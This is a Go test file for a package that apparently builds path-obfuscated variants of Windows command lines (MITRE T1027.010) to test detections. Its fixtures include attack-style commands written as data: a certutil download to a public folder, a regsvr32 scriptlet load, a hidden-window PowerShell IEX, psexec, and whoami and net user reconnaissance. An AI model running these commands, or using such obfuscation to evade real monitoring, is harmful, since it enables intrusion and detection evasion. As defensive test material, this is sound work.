package mutate

import (
	"strings"
	"testing"
)

// TestPathMutators pins the exact output of each path mutator on a realistic
// command line, and pins the cases where the mutator must decline. want == ""
// means "must return nil": either the value holds no Windows path, or it holds
// one Win32 would not canonicalize.
func TestPathMutators(t *testing.T) {
	cases := []struct {
		name    string
		mutator Mutator
		in      string
		want    string
	}{
		{
			name:    "separator/doubles the root separator",
			mutator: redundantSeparator{},
			in:      `C:\Windows\System32\rundll32.exe url.dll,OpenURL http://x/y`,
			want:    `C:\\Windows\System32\rundll32.exe url.dll,OpenURL http://x/y`,
		},
		{
			name:    "separator/no path is not applicable",
			mutator: redundantSeparator{},
			in:      "whoami /all",
			want:    "",
		},
		{
			name:    "separator/device prefix skips normalization",
			mutator: redundantSeparator{},
			in:      `cmd.exe /c type \\?\C:\Windows\System32\drivers\etc\hosts`,
			want:    "",
		},
		{
			name:    "dot-segment/before the final component",
			mutator: pathDotSegment{},
			in:      `C:\Windows\System32\rundll32.exe url.dll,OpenURL`,
			want:    `C:\Windows\System32\.\rundll32.exe url.dll,OpenURL`,
		},
		{
			name:    "dot-segment/on a path argument",
			mutator: pathDotSegment{},
			in:      `regsvr32.exe /s /u /i:C:\temp\payload.sct scrobj.dll`,
			want:    `regsvr32.exe /s /u /i:C:\temp\.\payload.sct scrobj.dll`,
		},
		{
			name:    "dot-segment/no path is not applicable",
			mutator: pathDotSegment{},
			in:      "net user administrator /domain",
			want:    "",
		},
		{
			name:    "dot-segment/refuses a long-path prefix",
			mutator: pathDotSegment{},
			in:      `\\?\C:\Windows\System32\rundll32.exe url.dll,OpenURL`,
			want:    "",
		},
		{
			name:    "traversal/cancelling filler before the final component",
			mutator: pathTraversalInsertion{},
			in:      `C:\Windows\System32\rundll32.exe url.dll,OpenURL`,
			want:    `C:\Windows\System32\temp\..\rundll32.exe url.dll,OpenURL`,
		},
		{
			name:    "traversal/relative path is not applicable",
			mutator: pathTraversalInsertion{},
			in:      `rundll32.exe url.dll,OpenURL`,
			want:    "",
		},
		{
			name:    "traversal/refuses a long-path prefix",
			mutator: pathTraversalInsertion{},
			in:      `\\?\C:\Windows\System32\rundll32.exe url.dll,OpenURL`,
			want:    "",
		},
		{
			name:    "traversal/refuses UNC",
			mutator: pathTraversalInsertion{},
			in:      `\\server\share\tools\rundll32.exe url.dll,OpenURL`,
			want:    "",
		},
		{
			name:    "exe-omission/strips the command token only",
			mutator: exeExtensionOmission{},
			in:      `certutil.exe -urlcache -split -f http://x/y C:\Users\Public\a.exe`,
			want:    `certutil -urlcache -split -f http://x/y C:\Users\Public\a.exe`,
		},
		{
			name:    "exe-omission/strips from a fully qualified command",
			mutator: exeExtensionOmission{},
			in:      `C:\Windows\System32\certutil.exe -decode in.txt out.dll`,
			want:    `C:\Windows\System32\certutil -decode in.txt out.dll`,
		},
		{
			name:    "exe-omission/command token without .exe is not applicable",
			mutator: exeExtensionOmission{},
			in:      "powershell -nop -w hidden -c IEX(...)",
			want:    "",
		},
		{
			name:    "exe-omission/argument .exe alone is not applicable",
			mutator: exeExtensionOmission{},
			in:      `copy C:\Windows\System32\cmd.exe C:\Users\Public\a.exe`,
			want:    "",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := tc.mutator.Apply(tc.in)
			if tc.want == "" {
				if len(got) != 0 {
					t.Fatalf("%s applied where it must not: %+v", tc.mutator.Name(), got)
				}
				return
			}
			if len(got) != 1 {
				t.Fatalf("%s returned %d results, want 1: %+v", tc.mutator.Name(), len(got), got)
			}
			if got[0].Value != tc.want {
				t.Errorf("%s\n got %q\nwant %q", tc.mutator.Name(), got[0].Value, tc.want)
			}
			if got[0].Value == tc.in {
				t.Errorf("%s returned a no-op variant", tc.mutator.Name())
			}
			if got[0].Note == "" {
				t.Errorf("%s returned a result with no note", tc.mutator.Name())
			}
		})
	}
}

// TestRedundantSeparatorNeverTouchesUNCPrefix is the load-bearing guard: the
// leading \\ of a UNC path is syntax rather than a separator run, and the server
// and share names behind it are resolved by the redirector, not by lexical
// canonicalization. Doubling or splitting anything up to and including the share
// would name a different target — or nothing at all.
func TestRedundantSeparatorNeverTouchesUNCPrefix(t *testing.T) {
	const in = `\\server\share\tools\psexec.exe -accepteula`
	got := redundantSeparator{}.Apply(in)
	if len(got) != 1 {
		t.Fatalf("expected one variant, got %d: %+v", len(got), got)
	}
	// The rewrite must land after the share, leaving \\server\share\ verbatim.
	if want := `\\server\share\\tools\psexec.exe -accepteula`; got[0].Value != want {
		t.Fatalf("\n got %q\nwant %q", got[0].Value, want)
	}
	v := got[0].Value
	if !strings.HasPrefix(v, `\\server\share\`) {
		t.Errorf("UNC root was rewritten: %q", v)
	}
	if strings.HasPrefix(v, `\\\`) || strings.Contains(v, `\\server`+`\\`) {
		t.Errorf("leading UNC pair was doubled or split: %q", v)
	}
	if strings.Count(v, `\\`) != 2 { // the leading pair, plus the one insertion
		t.Errorf("unexpected number of separator runs: %q", v)
	}
}

// TestPathMutatorsSkipBareUNCRoot checks the other end of the same guard: a
// \\server\share value has no rewritable interior, so every path mutator must
// decline rather than insert a segment where the share name belongs.
func TestPathMutatorsSkipBareUNCRoot(t *testing.T) {
	for _, in := range []string{`\\server\share`, `\\server\share\`, `\\server`} {
		for _, m := range []Mutator{redundantSeparator{}, pathDotSegment{}, pathTraversalInsertion{}} {
			if got := m.Apply(in); len(got) != 0 {
				t.Errorf("%s rewrote a bare UNC root %q: %+v", m.Name(), in, got)
			}
		}
	}
}

// TestExeOmissionLeavesLaterArgumentsIntact guards the token-0-only rule: a later
// .exe is a file the command reads or writes, and shortening it would change what
// the command does rather than how it looks.
func TestExeOmissionLeavesLaterArgumentsIntact(t *testing.T) {
	const in = `certutil.exe -urlcache -split -f http://x/y C:\Users\Public\a.exe`
	got := exeExtensionOmission{}.Apply(in)
	if len(got) != 1 {
		t.Fatalf("expected one variant, got %d", len(got))
	}
	if !strings.HasSuffix(got[0].Value, `C:\Users\Public\a.exe`) {
		t.Errorf("stripped .exe from an argument: %q", got[0].Value)
	}
	if strings.Count(got[0].Value, ".exe") != 1 {
		t.Errorf("expected exactly one surviving .exe (the argument), got %q", got[0].Value)
	}
}

// TestPathMutatorsAreDeterministic re-runs each mutator on the same input; Apply
// is pure, so the results must be byte-identical every time.
func TestPathMutatorsAreDeterministic(t *testing.T) {
	inputs := []string{
		`C:\Windows\System32\rundll32.exe url.dll,OpenURL`,
		`\\server\share\tools\psexec.exe -accepteula`,
		`certutil.exe -decode in.txt out.dll`,
		"whoami /all",
	}
	for _, m := range pathMutators() {
		for _, in := range inputs {
			first := m.Apply(in)
			for i := 0; i < 5; i++ {
				again := m.Apply(in)
				if len(again) != len(first) {
					t.Fatalf("%s output length varies on %q", m.Name(), in)
				}
				for j := range again {
					if again[j] != first[j] {
						t.Fatalf("%s output varies on %q: %+v vs %+v", m.Name(), in, first, again)
					}
				}
			}
		}
	}
}

// TestPathMutatorsRegistered confirms the four mutators reached the catalog and
// carry the metadata reports print next to a finding.
func TestPathMutatorsRegistered(t *testing.T) {
	want := map[string]bool{
		"redundant-separator":      false,
		"path-dot-segment":         false,
		"path-traversal-insertion": false,
		"exe-extension-omission":   false,
	}
	for _, m := range Catalog() {
		if _, ok := want[m.Name()]; !ok {
			continue
		}
		want[m.Name()] = true
		if m.Technique() != "T1027.010" {
			t.Errorf("%s technique = %q, want T1027.010", m.Name(), m.Technique())
		}
		if m.Describe() == "" || m.Remediation() == "" {
			t.Errorf("%s is missing describe/remediation text", m.Name())
		}
	}
	for name, found := range want {
		if !found {
			t.Errorf("mutator %q was not registered", name)
		}
	}
}

func pathMutators() []Mutator {
	return []Mutator{redundantSeparator{}, pathDotSegment{}, pathTraversalInsertion{}, exeExtensionOmission{}}
}
